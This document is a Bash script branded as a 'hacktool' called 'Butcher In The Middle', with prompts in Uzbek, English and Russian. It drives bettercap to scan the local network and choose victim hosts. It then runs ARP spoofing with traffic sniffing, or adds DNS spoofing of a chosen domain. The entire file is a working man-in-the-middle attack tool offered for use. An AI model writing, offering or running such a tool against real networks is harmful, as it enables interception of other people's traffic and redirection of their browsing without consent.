#!/bin/bash

TERMINAL_CMD="gnome-terminal"

RED="\e[1;31m"; GREEN="\e[1;32m"; YELLOW="\e[1;33m"
WHITE="\e[1;37m"; RESET="\e[0m"




clear
echo -e "${GREEN}"
cat <<'EOF'
██████╗    ██╗████████╗███╗   ███╗
██╔══██╗   ██║╚══██╔══╝████╗ ████║
██████╔╝   ██║   ██║   ██╔████╔██║
██╔══██╗   ██║   ██║   ██║╚██╔╝██║
██████╔╝██╗██║██╗██║██╗██║ ╚═╝ ██║
╚═════╝ ╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝     ╚═╝

------------ Butcher In The Middle 
-------------- by Butcher hacktool
EOF
echo -e "${RESET}"

declare -A MSG
MSG[scan.uz]="Tarmoqdagi qurilmalarni aniqlash..."
MSG[scan.en]="Scanning for devices..."
MSG[scan.ru]="Сканирование устройств..."

MSG[none.uz]="Hech qanday IP topilmadi."
MSG[none.en]="No IP addresses found."
MSG[none.ru]="IP-адреса не найдены."

MSG[list.uz]="Aniqlangan qurilmalar:"
MSG[list.en]="Detected hosts:"
MSG[list.ru]="Найденные устройства:"

MSG[choose.uz]="Qaysi IP(lar)ni tanlaysiz? (1,3 yoki a)"
MSG[choose.en]="Select target IP(s) (1,3 or a)"
MSG[choose.ru]="Выберите IP-адрес(а) (1,3 или a)"

MSG[iface.uz]="Interfeys (masalan eth0, bo‘sh qoldirsangiz default): "
MSG[iface.en]="Interface (e.g. eth0, leave blank for default): "
MSG[iface.ru]="Интерфейс (например eth0, пусто — по умолчанию): "

MSG[mode.uz]="1) Net sniffing (trafikni ko‘rish)\n2) DNS spoofing"
MSG[mode.en]="1) Net sniffing\n2) DNS spoofing"
MSG[mode.ru]="1) Перехват трафика\n2) DNS-спуфинг"

MSG[modech.uz]="Bo‘limni tanlang (1 yoki 2): "
MSG[modech.en]="Choose mode (1 or 2): "
MSG[modech.ru]="Выберите режим (1 или 2): "

MSG[dom.uz]="Spoof qilinadigan domain (masalan vulnweb.com): "
MSG[dom.en]="Domain to spoof (e.g. vulnweb.com): "
MSG[dom.ru]="Домен для спуфинга (например vulnweb.com): "

MSG[end.uz]="bettercap tugadi. Terminalni yoping."
MSG[end.en]="bettercap finished. Close this terminal."
MSG[end.ru]="bettercap завершён. Закройте это окно."

say() { echo -e "${WHITE}${MSG[$1.$LANG]}${RESET}"; }

read -p "Language [uz/en/ru]: " LANG
[[ -z $LANG ]] && LANG=uz
[[ ! $LANG =~ ^(uz|en|ru)$ ]] && LANG=uz

echo -e "${YELLOW}--------------------------------${RESET}"
say scan
echo -e "${YELLOW}--------------------------------${RESET}"

mapfile -t HOSTS < <(
  sudo bettercap -eval "net.probe on; sleep 5; net.show; exit" \
    | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u
)
if [[ ${#HOSTS[@]} -eq 0 ]]; then say none; exit 1; fi

say list
for i in "${!HOSTS[@]}"; do
  printf "${GREEN}%2d)${RESET} ${WHITE}%s${RESET}\n" "$((i+1))" "${HOSTS[$i]}"
done
echo -e " ${GREEN}[${RED}a${GREEN}]${RESET} ${WHITE}ALL${RESET} ${YELLOW}(set arp.spoof.all true)${RESET}\n"

read -p "$(say choose): " CHOICES
[[ -z "$CHOICES" ]] && { echo "Exit."; exit 1; }

USE_ALL=false; TARGET_IPS=""
if [[ "$CHOICES" =~ ^[Aa]$ ]]; then
    USE_ALL=true
else
    IFS=',' read -ra IDX <<< "$CHOICES"
    for n in "${IDX[@]}"; do
      ip=${HOSTS[$((n-1))]}
      [[ -n "$ip" ]] && TARGET_IPS+="$ip,"
    done
    TARGET_IPS=${TARGET_IPS%,}
fi
if [[ $USE_ALL = false && -z "$TARGET_IPS" ]]; then
  echo -e "${RED}No valid selection.${RESET}"; exit 1
fi

read -p "$(say iface)" IFACE

echo -e "$(say mode)"
read -p "$(say modech)" MODE

if $USE_ALL; then
    ARP_CMD="set arp.spoof.all true"
else
    ARP_CMD="set arp.spoof.targets $TARGET_IPS"
fi

if [[ "$MODE" == "1" ]]; then
    EVAL_CMD="set net.recon on; net.probe on; $ARP_CMD; arp.spoof on; net.sniff on"
elif [[ "$MODE" == "2" ]]; then
    read -p "$(say dom)" DOMAIN
    [[ -z "$DOMAIN" ]] && { echo -e "${RED}No domain.${RESET}"; exit 1; }
    EVAL_CMD="set net.recon on; net.probe on; $ARP_CMD; arp.spoof on; set dns.spoof.domains $DOMAIN; dns.spoof on; net.sniff on"
else
    echo -e "${RED}Invalid choice.${RESET}"; exit 1
fi

if [[ -n "$IFACE" ]]; then
    FULL_CMD="sudo bettercap -iface $IFACE -eval \"$EVAL_CMD\""
else
    FULL_CMD="sudo bettercap -eval \"$EVAL_CMD\""
fi

$TERMINAL_CMD -- bash -c "
echo -e '${GREEN}bettercap…${RESET}';
if $USE_ALL; then echo -e '${YELLOW}Target: ALL${RESET}';
else echo -e '${YELLOW}Target: ${WHITE}$TARGET_IPS${RESET}'; fi
echo;
$FULL_CMD;
echo; echo -e '${GREEN}$(say end)${RESET}';
exec bash"
